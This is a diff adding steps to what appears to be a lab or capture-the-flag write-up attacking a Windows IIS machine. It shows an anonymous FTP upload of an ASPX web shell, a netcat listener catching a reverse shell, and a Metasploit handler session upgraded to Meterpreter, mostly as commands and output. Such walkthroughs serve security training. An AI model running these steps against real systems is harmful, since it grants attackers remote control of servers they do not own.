@@ -178,4 +178,88 @@ PHP reverse shell source: https://github.com/pentestmonkey/php-reverse-shell/blo
 
 Upload to FTP source: https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/
 
+```
+hippoeug@kali:~$ nc -nvlp 4545
+listening on [any] 4545 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.5] 49162
+Spawn Shell...
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
+c:\windows\system32\inetsrv>
+```
+
+hippoeug@kali:~$ ftp 10.10.10.5 21
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:hippoeug): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       <DIR>          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+12-01-20  08:14PM                 5685 php-reverse-shell.php
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+ftp> put shell.aspx
+local: shell.aspx remote: shell.aspx
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+16393 bytes sent in 0.00 secs (31.0190 MB/s)
+ftp> ;s
+?Invalid command
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       <DIR>          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+12-01-20  08:14PM                 5685 php-reverse-shell.php
+12-01-20  08:18PM                16393 shell.aspx
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+  
+  
+ http://10.10.10.5/shell.aspx
+ 
+ 
+ msf5 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf5 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf5 exploit(multi/handler) > set LHOST 10.10.14.10
+LHOST => 10.10.14.10
+msf5 exploit(multi/handler) > set LPOrT 4545
+LPOrT => 4545
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.10:4545 
+[*] Command shell session 1 opened (10.10.14.10:4545 -> 10.10.10.5:49163) at 2020-11-28 18:40:59 +0800
+
+
+msf5 > use post/multi/manage/shell_to_meterpreter
